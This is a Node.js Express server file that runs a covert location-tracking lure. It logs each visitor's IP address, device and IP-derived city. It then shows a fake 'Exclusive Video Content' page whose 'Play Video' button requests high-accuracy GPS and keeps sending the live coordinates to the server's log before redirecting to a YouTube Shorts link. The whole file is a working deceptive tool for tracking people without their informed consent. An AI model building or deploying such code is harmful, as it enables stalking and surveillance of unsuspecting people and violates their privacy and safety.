const express = require('express');
const app = express();

const TARGET_URL = 'https://youtube.com/shorts/ojy2p-TxKhQ?si=4TxWKKtNcfzOBGaR';

app.get('/', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();

    // IP-based fallback log
    fetch(`http://ip-api.com/json/${ip.split(',')[0]}`)
        .then(response => response.json())
        .then(data => {
            console.log(`IP_LOG => Time: ${timestamp} | IP: ${ip} | Location: ${data.city}, ${data.regionName} | Device: ${userAgent}`);
        }).catch(() => {});

    // Button wala page taki browser permission block na kare
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Loading Video...</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding-top: 80px; background: #111; color: #fff; }
                .btn { background: #3498db; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; }
                .btn:active { background: #2980b9; }
            </style>
        </head>
        <body>
            <h2>Exclusive Video Content</h2>
            <p>Tap the button below to load the video:</p>
            <button class="btn" onclick="requestLocation()">Play Video</button>

            <script>
                function requestLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.watchPosition(function(position) {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            
                            // Server par live coordinates bhejna
                            fetch('/save-location?lat=' + lat + '&lon=' + lon);
                        }, function(error) {
                            alert("Please allow location access to watch the video.");
                        }, { 
                            enableHighAccuracy: true, 
                            maximumAge: 0, 
                            timeout: 20000 
                        });

                        // Thodi der mein video par redirect kar dena
                        setTimeout(function() {
                            window.location.href = '${TARGET_URL}';
                        }, 1500);
                    } else {
                        window.location.href = '${TARGET_URL}';
                    }
                }
            </script>
        </body>
        </html>
    `);
});

app.get('/save-location', (req, res) => {
    const lat = req.query.lat;
    const lon = req.query.lon;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const time = new Date().toLocaleTimeString();

    console.log(`LIVE_GPS_UPDATE => Time: ${time} | IP: ${ip} | Latitude: ${lat} | Longitude: ${lon}`);
    res.sendStatus(200);
});

module.exports = app;
